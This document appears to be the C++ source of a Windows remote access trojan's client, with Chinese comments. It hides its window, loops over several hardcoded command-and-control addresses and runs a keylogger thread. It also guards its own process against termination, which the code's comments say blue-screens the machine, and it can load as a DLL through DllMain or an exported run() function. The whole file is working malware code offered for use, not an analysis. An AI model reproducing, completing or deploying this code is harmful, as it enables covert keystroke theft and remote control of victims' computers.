#include "stdafx.h"
#include "help.h"

#ifdef _WINDLL
#else
#pragma comment( linker, "/subsystem:windows /entry:wmainCRTStartup" ) 
#endif


 Info MyInfo =
{
	"denglupeizhi",
		_T("192.168.1.200"),
	_T("6669"),
	1,
		_T("192.168.1.200"),
	_T("6669"),
	1,
		_T("192.168.1.200"),
	_T("9999"),
	1,
	_T("3"),
	_T("3"),
	_T("默认"),
	_T("1.0"),
	_T("测试备注"),
	{
	false,
	false,
	false,
	false,
	false,

	false,
	false,
	false,
	false,
	false,

	_T(""),
	_T(""),
	_T(""),
	_T(""),
	_T(""),

	},
};





bool changeip = false;
int m_time_con = 0;

TCHAR szAddress[255];  //ip
TCHAR szPort[30];		//端口
TCHAR szPassword[255];  //通信密码
BOOL IsTcp;			//通信模式

HANDLE hThread = NULL;
HANDLE hThread_bd = NULL;

//初始化上线通信
ISocketBase* socketClient = NULL;


DWORD WINAPI MainThread()
{


	//开始等待的时间
	Sleep(_ttoi(MyInfo.szRunSleep) * 1000);

	//进程守护
	if (MyInfo.otherset.Processdaemon)
	{
		PROCESS_INFORMATION* pi = new PROCESS_INFORMATION;
		CloseHandle((HANDLE)_beginthreadex(NULL, 0, loactThreadProc, pi, 0, NULL));
	}


	//使进程无法手动结束  不然蓝屏
	if (MyInfo.otherset.ProtectedProcess) CallNtSetinformationProcess();


	//运行时间开始
	TCHAR			Time[255];		//运行时间
	GetTimeFormat(Time);

	//异常重启
	SetUnhandledExceptionFilter(My_bad_exception);//崩溃重启

	//键盘记录
	CloseHandle((HANDLE)_beginthreadex(NULL, 0, KeyLogger, NULL, 0, NULL));

	void* ptcp = new CTcpSocket;
	void* pudp = new CUdpSocket;


	while (TRUE)
	{
		if (!changeip)
		{

			Trace("qh-1");
			_tcscpy_s(szAddress, MyInfo.szAddress);
			_tcscpy_s(szPort, MyInfo.szPort);

			IsTcp = MyInfo.IsTcp;
			changeip = (!changeip);
		}
		else
		{
			Trace("qh-2");
			_tcscpy_s(szAddress, MyInfo.szAddress2);
			_tcscpy_s(szPort, MyInfo.szPort2);
			IsTcp = MyInfo.IsTcp2;
			changeip = (!changeip);
		}

		//第三备用IP端口
		m_time_con++;
		if (m_time_con == 200)
		{
			Trace("by3");
			_tcscpy_s(szAddress, MyInfo.szAddress3);
			_tcscpy_s(szPort, MyInfo.szPort3);
			IsTcp = MyInfo.IsTcp3;
			m_time_con = 0;
			//或者其他动作
		}
		if (socketClient)
			socketClient->Disconnect();
	
		if (IsTcp == 1)
			socketClient = (CTcpSocket*)ptcp;
		else
			socketClient = (CUdpSocket*)pudp;
	


		if (MyInfo.otherset.antinet)
		{
			while (AntiCheck())
				Sleep(20000);
		}

		if (!socketClient->Connect(szAddress, _ttoi(szPort)))
		{
			Sleep(3000);
			continue;
		}

		//绑定
		CLoginManager	manager(socketClient, szAddress, _ttoi(szPort), IsTcp, MyInfo.otherset.special);

		// 登录
		while (!MyInfo.otherset.special)
		{
			Sleep(4000);
			HKEY hKEY;
			DWORD dwType = REG_BINARY;
			DWORD dwTypesize = REG_DWORD;
			DWORD dw = sizeof(DWORD);
			DWORD IpDateSize = 0;
			if (ERROR_SUCCESS == ::RegOpenKeyEx(HKEY_CURRENT_USER, _T("Console"), 0, KEY_READ, &hKEY))
			{
				RegQueryValueEx(hKEY, _T("IpDatespecial"), NULL, &dwType, NULL, &IpDateSize);
			}
			if (IpDateSize > 1)
				continue;
			else
				break;
		}

		if (sendLoginInfo(socketClient, Time, MyInfo.otherset.special) == -1)
		{
			socketClient->Disconnect();
			continue;
		}
	
		HANDLE hThread_anticheck;
		if (MyInfo.otherset.antinet)
		{
			hThread_anticheck = (HANDLE)_beginthreadex(NULL, 0, AntiCheckThread, (LPVOID)&manager, 0, NULL);
		}
		//////////////////////////////////////////////////////////////////////////
		// 等待控制端发送激活命令，超时为10秒，重新连接,以防连接错误
		for (int i = 0; (i < 10 && !manager.IsActived()); i++)
		{
			Sleep(1000);
		}
		if (!manager.IsActived())
		{
			socketClient->Disconnect();
			if (MyInfo.otherset.antinet)
			{
				WaitForSingleObject(hThread_anticheck, INFINITE);
				CloseHandle(hThread_anticheck);
			}
			Sleep(1000);
			continue;
		}

		socketClient->run_event_loop();
		if (MyInfo.otherset.antinet)
		{
			WaitForSingleObject(hThread_anticheck, INFINITE);
			CloseHandle(hThread_anticheck);
		}

		Sleep(_ttoi(MyInfo.szHeart) * 1000);

	}


	return 0;

}





#ifndef _WINDLL

#include "DbgHelp.h"
int GenerateMiniDump(PEXCEPTION_POINTERS pExceptionPointers)
{
	// 定义函数指针
	typedef BOOL(WINAPI* MiniDumpWriteDumpT)(
		HANDLE,
		DWORD,
		HANDLE,
		MINIDUMP_TYPE,
		PMINIDUMP_EXCEPTION_INFORMATION,
		PMINIDUMP_USER_STREAM_INFORMATION,
		PMINIDUMP_CALLBACK_INFORMATION
		);
	// 从 "DbgHelp.dll" 库中获取 "MiniDumpWriteDump" 函数
	MiniDumpWriteDumpT pfnMiniDumpWriteDump = NULL;
	HMODULE hDbgHelp = LoadLibrary((_T("DbgHelp.dll")));
	if (NULL == hDbgHelp)
	{
		return EXCEPTION_CONTINUE_EXECUTION;
	}
	pfnMiniDumpWriteDump = (MiniDumpWriteDumpT)GetProcAddress(hDbgHelp, "MiniDumpWriteDump");

	if (NULL == pfnMiniDumpWriteDump)
	{
		FreeLibrary(hDbgHelp);
		return EXCEPTION_CONTINUE_EXECUTION;
	}
	// 创建 dmp 文件件
	TCHAR szFileName[MAX_PATH] = { 0 };
	TCHAR* szVersion = _T("!analyze -v");
	SYSTEMTIME stLocalTime;
	GetLocalTime(&stLocalTime);
	wsprintf(szFileName, _T("%s-%04d%02d%02d-%02d%02d%02d.dmp"),
		szVersion, stLocalTime.wYear, stLocalTime.wMonth, stLocalTime.wDay,
		stLocalTime.wHour, stLocalTime.wMinute, stLocalTime.wSecond);
	HANDLE hDumpFile = CreateFile(szFileName, GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_WRITE | FILE_SHARE_READ, 0, CREATE_ALWAYS, 0, 0);
	if (INVALID_HANDLE_VALUE == hDumpFile)
	{
		FreeLibrary(hDbgHelp);
		return EXCEPTION_CONTINUE_EXECUTION;
	}
	// 写入 dmp 文件
	MINIDUMP_EXCEPTION_INFORMATION expParam;
	expParam.ThreadId = GetCurrentThreadId();
	expParam.ExceptionPointers = pExceptionPointers;
	expParam.ClientPointers = FALSE;
	pfnMiniDumpWriteDump(GetCurrentProcess(), GetCurrentProcessId(),
		hDumpFile, MiniDumpWithDataSegs, (pExceptionPointers ? &expParam : NULL), NULL, NULL);
	// 释放文件
	CloseHandle(hDumpFile);
	FreeLibrary(hDbgHelp);
	return EXCEPTION_EXECUTE_HANDLER;
}


LONG WINAPI ExceptionFilter(LPEXCEPTION_POINTERS lpExceptionInfo)
{
	// 这里做一些异常的过滤或提示
	if (IsDebuggerPresent())
	{
		return EXCEPTION_CONTINUE_SEARCH;
	}
	return GenerateMiniDump(lpExceptionInfo);
}

int _tmain(int argc, _TCHAR* argv[])
{
	SetUnhandledExceptionFilter(ExceptionFilter);

	// 让启动程序时的小漏斗马上消失
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	PostThreadMessageA(GetCurrentThreadId(), NULL, 0, 0);
	GetInputState();
	hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)MainThread, 0, 0, 0);	//启动线程
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	Sleep(300);
	return 0;
}
#else


BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		if (hThread == NULL)
		{
			hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)MainThread, 0, 0, 0);	//启动线程
			WaitForSingleObject(hThread, INFINITE);
		}
		
	}
	break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

extern "C" __declspec(dllexport) bool run()
{
	HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)MainThread, 0, 0, 0);	//启动线程
	WaitForSingleObject(hThread, INFINITE);
	Sleep(300);
	return 0;
}




#endif
